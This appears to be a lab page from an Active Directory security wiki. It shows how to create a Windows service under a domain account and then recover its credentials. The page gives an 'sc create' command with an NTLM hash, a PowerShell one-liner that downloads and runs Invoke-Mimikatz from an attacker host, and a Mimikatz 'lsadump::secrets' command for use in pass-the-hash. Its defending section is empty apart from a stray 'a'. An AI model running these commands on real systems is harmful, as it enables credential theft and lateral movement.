---
description: >-
  It's possible to create custom services, which will run with a local or a
  domain account. When you have high enough privilege's, it's possible to
  retrieve the credentials of the service.
---

# Services

## Configuring

### Prerequisite&#x20;

* domain account, which will run the service.&#x20;

### Configuring

We've created the user account _noah._

1. Login with an `Administrator` account into the machine, where you want to configure the service. In our example we will configure this within `WS01`.
2. Open up _cmd.exe_
3. We're going to execute the command:

```
sc create <name> binPath="C:\nonexisting.exe" obj="<username>@<domain>" password="<plaintext password or NTLM hash of the user>"
```

The password of the service can be fake. So to make our attack a bit more fun, we're going to place the NTLM hash of the user `Noah`. This will enable us to make it a 'pass-the-hash' attack.

In our example we're going to execute the following command:

```
 sc create TryToReadThePassword binPath="C:\Program Files\OfThisService.exe" obj="Noah@Amsterdam" password="02671733e400aa35ad23828f5df3b676"
```

When executed, we will get a success message.

## Attacking

### How it works



### Tools

* [MimiKatz ](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

### Executing the attack

For this attack we need a high priviliged user.

1. Start PowerShell as an Administrator.
2. Execute MimiKatz. This can be done in many ways. In our example we will be hosting Invoke-mimikatz.ps1 on our attacker machine. Download mimikatz into memory using the following command and then execute MimiKatz:

```
IEX (New-Object System.Net.Webclient).DownloadString('http://<ip>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::secrets" "exit"'
```

The result is that our freshly created service is shown, including with username and NTLM Hash:

![](../../../.gitbook/assets/image.png)

With the hash we can try to execute pass-the-hash attacks.

## Defending

### Recommendations

* a

### Detection



## References
